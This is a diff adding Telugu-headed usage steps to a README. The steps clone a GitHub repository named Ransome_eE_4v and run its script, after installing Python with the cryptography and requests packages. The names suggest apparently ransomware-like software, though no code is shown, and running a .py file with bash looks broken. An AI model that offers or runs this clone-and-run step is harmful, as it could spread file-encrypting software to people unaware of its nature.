@@ -34,3 +34,8 @@ pkg install python
 pip install cryptography colorama requests
 ```
 ## ▶️ వాడే విధానం
+```
+git clone https://github.com/sunnamsriram1/Ransome_eE_4v.git
+cd Ransome_eE_4v
+bash Ransom_eE_4v.py
+```
